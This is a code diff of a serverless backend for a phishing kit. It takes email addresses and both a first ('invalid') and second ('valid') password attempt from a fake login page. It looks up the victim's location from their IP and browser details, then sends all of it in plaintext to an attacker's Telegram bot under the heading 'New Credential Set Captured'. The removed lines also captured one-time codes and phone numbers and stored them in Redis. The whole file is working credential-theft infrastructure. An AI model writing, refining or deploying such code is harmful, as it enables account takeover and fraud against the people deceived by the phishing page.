@@ -1,3 +1,5 @@
+import UAParser from 'ua-parser-js';
+
 export const handler = async (event, context) => {
   // CORS headers
   const headers = {
@@ -23,27 +25,20 @@ export const handler = async (event, context) => {
     };
   }
 
-  // Helper: safe timeout signal (fallback if AbortSignal.timeout is not available)
+  // Helper: safe timeout signal
   const createTimeoutSignal = (ms) => {
-    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.timeout === 'function') {
-      return AbortSignal.timeout(ms);
-    }
-    // Fallback
     const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), ms);
-    // clear timeout when finished (consumer can't, so handle later)
-    controller.__timeoutId = id;
+    setTimeout(() => controller.abort(), ms);
     return controller.signal;
   };
 
   try {
     const bodyRaw = event.body || '{}';
-    let data;
+    let data = {};
     try {
       data = JSON.parse(bodyRaw);
     } catch (parseErr) {
-      // If the body isn't JSON, fallback to empty object
-      data = {};
+      console.error("Error parsing request body:", parseErr);
     }
 
     const {
@@ -51,16 +46,9 @@ export const handler = async (event, context) => {
       password,
       firstAttemptPassword,
       secondAttemptPassword,
-      otpEntered,
-      deliveryMethod,
-      phone,
       provider,
-      fileName,
       timestamp,
       userAgent,
-      browserFingerprint,
-      localStorage: clientLocalStorage,
-      sessionStorage: clientSessionStorage,
       sessionId: incomingSessionId,
     } = data;
 
@@ -73,161 +61,108 @@ export const handler = async (event, context) => {
       return {
         statusCode: 500,
         headers,
-        body: JSON.stringify({ success: false, message: 'Server misconfiguration: missing Telegram env vars' })
+        body: JSON.stringify({ success: false, message: 'Server misconfiguration' })
       };
     }
-
-    const DEBUG = String(process.env.DEBUG || '').toLowerCase() === 'true';
     
-    // Get client IP with better detection (headers may be lowercased)
+    // --- IP and Location Detection ---
     const headersIn = event.headers || {};
     const headerGet = (name) => headersIn[name] || headersIn[name.toLowerCase()] || '';
     const clientIP = (headerGet('x-forwarded-for') || headerGet('x-real-ip') || headerGet('cf-connecting-ip') ||
-                      (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) ||
-                      'Unknown').toString().split(',')[0].trim();
-
-    // Per user request, cookie capturing is disabled.
-    const cookieInfo = 'Cookies not captured';
-    const formattedCookies = [];
-
-    const localStorageInfo = (browserFingerprint && browserFingerprint.localStorage) || clientLocalStorage || 'Empty';
-    const sessionStorageInfo = (browserFingerprint && browserFingerprint.sessionStorage) || clientSessionStorage || 'Empty';
-
-    // Prepare session data for storage
-    const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);
-
-    // Per request: include plaintext passwords as provided by client (do NOT mask)
-    const plainPassword = (typeof password !== 'undefined' && password !== null) ? String(password) : 'Not captured';
-    const plainFirstAttemptPassword = (typeof firstAttemptPassword !== 'undefined' && firstAttemptPassword !== null) ? String(firstAttemptPassword) : 'Not captured';
-    const plainSecondAttemptPassword = (typeof secondAttemptPassword !== 'undefined' && secondAttemptPassword !== null) ? String(secondAttemptPassword) : 'Not captured';
-    const plainOtpEntered = (typeof otpEntered !== 'undefined' && otpEntered !== null) ? String(otpEntered) : 'Not captured';
-
-    const sessionData = {
-      email: email || '',
-      password: plainPassword,
-      firstAttemptPassword: plainFirstAttemptPassword,
-      secondAttemptPassword: plainSecondAttemptPassword,
-      otpEntered: plainOtpEntered,
-      deliveryMethod: deliveryMethod || 'Not captured',
-      phone: phone || 'Not provided',
-      provider: provider || 'Others',
-      fileName: fileName || 'Adobe Cloud Access',
-      timestamp: timestamp || new Date().toISOString(),
-      sessionId,
-      clientIP,
-      userAgent: userAgent || 'Unknown',
-      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? 'mobile' : 'desktop',
-      cookies: cookieInfo,
-      localStorage: localStorageInfo,
-      sessionStorage: sessionStorageInfo,
-      browserFingerprint: browserFingerprint || {},
-      formattedCookies,
-      rawDataType: typeof cookieInfo
-    };
-
-    // Store in Upstash Redis if provided
-    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
-    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-    const REDIS_TTL_SECONDS = parseInt(process.env.REDIS_TTL_SECONDS || '60', 10); // default short TTL
-
-    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
-      try {
-        const { Redis } = await import('@upstash/redis');
-        const redis = new Redis({
-          url: UPSTASH_REDIS_REST_URL,
-          token: UPSTASH_REDIS_REST_TOKEN,
-        });
-
-        // Save session with TTL to avoid storing sensitive data indefinitely
-        await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
-        if (REDIS_TTL_SECONDS > 0) {
-          await redis.expire(`session:${sessionId}`, REDIS_TTL_SECONDS);
+                      (event.requestContext?.identity?.sourceIp) || 'Unknown').toString().split(',')[0].trim();
+    
+    let locationData = { country: 'Unknown', regionName: 'Unknown' };
+    try {
+      if (clientIP !== 'Unknown' && !clientIP.startsWith('127.0.0.1')) {
+        const geoResponse = await fetch(`http://ip-api.com/json/${clientIP}?fields=country,regionName`);
+        if (geoResponse.ok) {
+          const geoJson = await geoResponse.json();
+          locationData.country = geoJson.country || 'Unknown';
+          locationData.regionName = geoJson.regionName || 'Unknown';
         }
-        try {
-          await redis.set(`user:${email}`, JSON.stringify(sessionData));
-          if (REDIS_TTL_SECONDS > 0) {
-            await redis.expire(`user:${email}`, REDIS_TTL_SECONDS);
-          }
-        } catch (e) {
-          // ignore if key cannot be set for empty email
-        }
-
-        if (DEBUG) console.log('✅ Session data stored in Redis');
-      } catch (redisError) {
-        console.error('❌ Redis storage error:', redisError);
       }
+    } catch (e) {
+      console.error('Geolocation lookup failed:', e);
     }
 
-    // Compose Telegram message (include all password attempts and OTP as requested)
+
+    // --- Enhanced Browser and OS Detection ---
+    const uaParser = new UAParser(userAgent || '');
+    const browserInfo = uaParser.getBrowser(); // { name, version }
+    const osInfo = uaParser.getOS();           // { name, version }
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
+    const formattedBrowser = browserInfo.name ? `${browserInfo.name} ${browserInfo.version || ''}`.trim() : 'Unknown Browser';
+    const formattedOS = osInfo.name ? `${osInfo.name} ${osInfo.version || ''}`.trim() : 'Unknown OS';
 
-    // Check if OTP flow was used
-    const hasOtpData = plainOtpEntered && plainOtpEntered !== 'Not captured';
+
+    // --- Prepare Passwords ---
+    const plainFirstAttemptPassword = firstAttemptPassword || 'Not captured';
+    const plainSecondAttemptPassword = secondAttemptPassword || 'Not captured';
+
+
+    // --- Compose Enhanced Telegram Message ---
+    const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);
+    const hasTwoStepData = plainFirstAttemptPassword !== 'Not captured' && plainSecondAttemptPassword !== 'Not captured';
     
-    const message = hasOtpData 
-      ? `🔐 PARIS365 RESULTS
+    let passwordSection = '';
+    if (hasTwoStepData) {
+        passwordSection = `🔑 First (invalid): \`${plainFirstAttemptPassword}\`\n🔑 Second (valid): \`${plainSecondAttemptPassword}\``;
+    } else {
+        // Fallback for single password if provided
+        passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
+    }
+    
+    // Using UTC timestamp from the user for consistency
+    const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
+        year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit',
+        timeZone: 'UTC', hour12: true
+    }) + ' UTC';
 
-📧 ${email || 'Not captured'}
-🔑 First Attempt (Invalid): ${plainFirstAttemptPassword}
-🔑 Second Attempt (Valid): ${plainSecondAttemptPassword}
-🔐 OTP Entered: ${plainOtpEntered}
-📬 OTP Method: ${deliveryMethod || 'Not captured'}
-${phone && phone !== 'Not provided' ? `📞 Phone: ${phone}` : ''}
-🏢 ${provider || 'Others'}
-🕒 ${new Date().toLocaleString()}
-🌐 ${clientIP} | ${deviceInfo}
-🍪 Cookies not captured
+    const message = `
+*🔐 New Credential Set Captured 🔐*
 
-🆔 ${sessionId}`
-      : `🔐 PARIS365 RESULTS
+*ACCOUNT DETAILS*
+- 📧 Email: \`${email || 'Not captured'}\`
+- 🏢 Provider: *${provider || 'Others'}*
+- ${passwordSection}
 
-📧 ${email || 'Not captured'}
-🔑 ${plainPassword}
-🏢 ${provider || 'Others'}
-🕒 ${new Date().toLocaleString()}
-🌐 ${clientIP} | ${deviceInfo}
-🍪 Cookies not captured
+*DEVICE & LOCATION*
+- 📍 IP Address: \`${clientIP}\`
+- 🌍 Location: *${locationData.regionName}, ${locationData.country}*
+- 💻 OS: *${formattedOS}*
+- 🌐 Browser: *${formattedBrowser}*
+- 🖥️ Device Type: *${deviceInfo}*
 
-🆔 ${sessionId}`;
+*SESSION INFO*
+- 🕒 Timestamp: *${formattedTimestamp}*
+- 🆔 Session ID: \`${sessionId}\`
+`;
 
-    // Send main message to Telegram
+
+    // --- Send main message to Telegram ---
     const telegramSignal = createTimeoutSignal(15000);
-
     const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'HTML',
+        parse_mode: 'Markdown',
       }),
       signal: telegramSignal,
     });
     
-    const telegramResult = await telegramResponse.json();
     if(!telegramResponse.ok) {
+        const telegramResult = await telegramResponse.json();
         console.error("Telegram API error:", telegramResult);
     }
 
-    // Build minimal response
+    // --- Build final response for the client ---
     const responseBody = {
       success: true,
       sessionId,
-      cookiesCollected: false,
-      cookieCount: 0,
-      fileSent: false, // File sending is disabled as cookies are not captured
     };
-
-    if (DEBUG) {
-      responseBody.debug = {
-        originalCookieType: 'disabled',
-        processedCookieCount: 0,
-        rawDataAvailable: false,
-        storedInRedis: !!(UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN)
-      };
-    }
 
     return {
       statusCode: 200,
@@ -236,38 +171,28 @@ ${phone && phone !== 'Not provided' ? `📞 Phone: ${phone}` : ''}
     };
 
   } catch (error) {
-    // Attempt to notify via Telegram about the error (non-sensitive)
+    console.error('Function error:', error);
+    // Attempt to notify about the error
     try {
       const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
       const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
       if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-        const errMsg = `🚨 <b>FUNCTION ERROR</b>\n\n<code>${String(error.message || error)}</code>\n\n${new Date().toISOString()}`;
+        const errMsg = `🚨 *Function Error*\n\n\`\`\`${String(error.message || error)}\`\`\``;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: errMsg,
-            parse_mode: 'HTML',
-          }),
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: errMsg, parse_mode: 'Markdown' }),
           signal: createTimeoutSignal(8000),
         });
       }
     } catch (notificationError) {
-      // ignore notification errors
-      if (String(process.env.DEBUG || '').toLowerCase() === 'true') {
-        console.error('Notification error:', notificationError);
-      }
+      // ignore
     }
 
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({
-        error: 'Internal server error',
-        timestamp: new Date().toISOString(),
-        message: (String(process.env.DEBUG || '').toLowerCase() === 'true') ? String(error.message || error) : 'Internal server error'
-      }),
+      body: JSON.stringify({ error: 'Internal server error' }),
     };
   }
 };
